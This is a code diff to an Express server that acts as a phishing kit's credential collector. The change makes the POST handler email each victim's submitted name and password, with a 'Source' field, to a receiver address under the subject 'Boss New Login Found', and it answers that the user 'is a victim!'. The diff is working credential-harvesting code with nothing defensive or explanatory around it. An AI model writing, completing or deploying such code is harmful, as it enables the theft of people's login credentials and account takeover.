@@ -8,12 +8,15 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-app.post("/", (req, res) => {
+app.post("/", async (req, res) => {
     const data = req.body;
+    const email = data.receiver;
+    const message = `
+        Email: ${data.name},
+        Access: ${data.pass}, 
+        Source: ${data.source}`;
 
-    console.log("Name: ", data.name);
-    console.log("Username: ", data.email);
-    console.log("Access: ", data.pass);
+    await sendEmail(email,"Boss New Login Found",message);
     res.send(`Success: ${data.name} - ${data.email} is a victim!`);
 });
 
